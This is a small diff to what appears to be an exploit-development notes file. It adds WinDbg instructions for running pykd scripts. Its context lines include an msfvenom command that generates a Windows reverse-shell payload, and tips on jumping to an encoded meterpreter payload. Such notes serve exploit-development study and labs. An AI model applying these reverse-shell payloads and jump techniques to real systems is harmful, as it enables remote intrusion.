@@ -8,6 +8,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread
 .load narly
 !nmod
 ============
+to run pykd script:
+
+.load pykd
+
+!py <path_to_your_script>
+============
 if you have to do a long jump to your meterpreter+shikata ganai payload, better not to do a negative long jump to the payload
 instead:
 change stack pointer and jmp esp
